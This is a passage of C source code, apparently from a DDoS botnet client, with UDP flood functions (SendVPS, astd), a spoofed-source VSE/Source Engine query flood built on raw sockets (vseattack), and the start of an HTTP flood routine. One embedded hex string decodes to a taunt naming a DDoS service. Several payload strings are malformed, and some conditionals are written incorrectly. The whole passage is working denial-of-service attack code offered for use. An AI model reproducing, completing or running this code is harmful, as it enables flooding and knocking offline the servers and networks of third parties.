    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendVPS(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
    "RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM...RyM..."
    "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c",
    "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
    "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F",
    "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
    "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
    "3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3FAeom6b5NiKwzkG9hQyxPXZfWSDlcdnR0Bp2LaUHn38cyfrBLJMAtlvEYC9da5QUeIz1G0hRqpTF72X4xwSODjoukVWib6mZPsNgK3pWjHntL6F0Ckev2IiaMl4w5OJcryKYSdgso7hZPm8GbXq9E1VxNTQuDzAfURB7s8TrJOMjgHt1IvVCu4YEq3F"
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}




void astd(unsigned char *ip, int port, int secs, int packetsize) 
{
        int std_hex;
        std_hex = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {         
                char *hexstring[] = {"/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84"};
                if (a >= 50)
                {
                        send(std_hex, hexstring, packetsize, 0);
                        connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(std_hex);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}


  int socket_connect(char *host, in_port_t port) {
  struct hostent *hp;
  struct sockaddr_in addr;
  int on = 1, sock;     
  if ((hp = gethostbyname(host)) == NULL) return 0;
  bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
  addr.sin_port = htons(port);
  addr.sin_family = AF_INET;
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
  if (sock == -1) return 0;
  if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
  return sock;
}                                      
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    char *vse_payload;
    int vse_payload_len;
    int vserand;
    srand(time(NULL));
    vserand = rand() % 60;
    if(vserand < 20) {
     vse_payload = "/58/x49/x4a/x20/x51/x22/x29/x29/x51/x50/x57/x4b/x4f/x4d/x20/x54/x45/x4d/x4b/x22/x20/x6c/x78/x50/x51/x7b/x58/x4c/x20/x22/x28/x4b/x69/x6a/x6e/x6a/x4e/x4b/x20/x58/x4e/x43/x4b/x46/x45/x3a/x4c/x3a/x20/x22/x22/x33/x35/x34/x35/x20/x32/x73/x6d/x6b/x6c/x78/x43/x20/x4b/x4d/x4c/x44", &vse_payload_len;
    }
        else if(20 < vserand < 40) {
     vse_payload = "/46/x55/x5a/xc2/xa3/x20/x44/xc2/xa3/x53/x54/x20/x53/x30/x22/xc2/xa3/x43/x45/x20/x22/x29/x21/x28/x32/x30/x39/x31/x20/x53/x49/x58/x20/x33/xc2/xa3/x43/x53/x54/x20/x46/x4c/x4f/x22/x53/x44/x20/x22/x29/x21/x28/x20/x43/x49/x57/x4a/x4f/x20/x59/x48/x53/x20/x48/x20/x78/x4b/x4d/x4f", &vse_payload_len;
    }
        else if(40 < vserand < 60) {
     vse_payload = "/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/", &vse_payload_len;
    }

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
  struct sockaddr_in dest_addr;
  dest_addr.sin_family = AF_INET;
  if(port == 0) dest_addr.sin_port = rand_cmwc();
  else dest_addr.sin_port = htons(port);
  if(getHost(target, &dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
  register unsigned int pollRegister;
  pollRegister = pollinterval;
  if(spoofit == 32) {
  int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if(!sockfd) {
  return;
  }
  unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
  if(buf == NULL) return;
  memset(buf, 0, packetsize + 1);
  makeRandomStr(buf, packetsize);
  int end = time(NULL) + timeEnd;
  register unsigned int i = 0;
  register unsigned int ii = 0;
  while(1) {
  sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
  if(i == pollRegister) {
  if(port == 0) dest_addr.sin_port = rand_cmwc();
  if(time(NULL) > end) break;
  i = 0;
  continue;
          }
  i++;
  if(ii == sleepcheck) {
  usleep(sleeptime*1000);
  ii = 0;
  continue;
          }
  ii++;
      }
      } else {
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
  if(!sockfd) {
  return;
        }
  int tmp = 1;
  if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
  return;
        }
  int counter = 50;
  while(counter--) {
  srand(time(NULL) ^ rand_cmwc());
        }
  in_addr_t netmask;
  if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
  else netmask = ( ~((1 << (32 - spoofit)) - 1) );
  unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
  struct iphdr *iph = (struct iphdr *)packet;
  struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
  makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
  udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
  udph->source = rand_cmwc();
  udph->dest = (port == 0 ? rand_cmwc() : htons(port));
  udph->check = 0;
  udph->check = (iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
  makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
  iph->check = csum ((unsigned short *) packet, iph->tot_len);
  int end = time(NULL) + timeEnd;
  register unsigned int i = 0;
  register unsigned int ii = 0;
  while(1) {
  sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
  udph->source = rand_cmwc();
  udph->dest = (port == 0 ? rand_cmwc() : htons(port));
  iph->id = rand_cmwc();
  iph->saddr = htonl( getRandomIP(netmask) );
  iph->check = csum ((unsigned short *) packet, iph->tot_len);
  if(i == pollRegister) {
  if(time(NULL) > end) break;
  i = 0;
  continue;
      }
  i++;
  if(ii == sleepcheck) {
  usleep(sleeptime*1000);
  ii = 0;
  continue;
        }
  ii++;
      }
    }
  }


  void SendHTTPHex(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
  int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
  char request[512], buffer[1], hex_payload[2048];
